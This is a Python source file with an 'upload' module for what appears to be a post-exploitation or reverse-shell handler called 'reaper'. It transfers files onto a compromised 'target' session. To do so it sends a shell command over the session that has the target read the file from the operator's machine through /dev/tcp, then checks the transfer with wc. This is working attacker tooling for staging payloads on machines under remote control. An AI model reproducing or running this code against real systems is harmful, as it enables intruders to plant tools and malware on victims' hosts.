from __future__ import annotations

import os
from pathlib import Path

from reaper.modules.blueprint import ReaperModule
from reaper.utils.tcp import get_local_ip, spawn_send_server


class UploadModule(ReaperModule):
    name        = "upload"
    description = "Upload a local file to the target."
    usage       = "upload <id> <local_path> [remote_path]"
    category    = "File Transfer"
    platform    = ["linux"]
    arguments   = [
        {"flags": ["local_path"],  "help": "Local file to upload"},
        {"flags": ["remote_path"], "help": "Remote destination path", "nargs": "?", "default": None},
    ]

    def run(self) -> None:
        local  = Path(self.args.local_path)
        remote = self.args.remote_path or f"/tmp/{local.name}"

        if not local.exists():
            self.err(f"File not found: {local}")
            return
        if not local.is_file():
            self.err(f"Not a file: {local}")
            return

        data      = local.read_bytes()
        local_ip  = get_local_ip(self.session.addr[0])
        total     = len(data)

        self.notify("info", f"Uploading {self.ui._c(str(local))} → {self.ui._y(remote)}  ({total} bytes)")

        transferred = [0]
        def _progress(sent: int) -> None:
            transferred[0] = sent

        with self.spinner(f"Transferring {total} bytes…"):
            port, thread, errors = spawn_send_server(data, timeout=30.0, on_progress=_progress)
            cmd = (
                f"cat > {remote} < /dev/tcp/{local_ip}/{port}\n"
            )
            self.session.conn.sendall(cmd.encode("utf-8"))
            thread.join(timeout=35.0)

        if errors:
            self.err(f"Upload failed: {errors[0]}")
            return

        verify = self.exec(f"wc -c {remote} 2>/dev/null", timeout=10.0)
        remote_size = verify.stdout.strip().split()[0] if verify.stdout.strip() else "?"

        if str(remote_size) == str(total):
            self.ok(f"Uploaded {self.ui._y(remote)}  ({remote_size} bytes)")
        else:
            self.warn(f"Size mismatch – local={total}  remote={remote_size}")
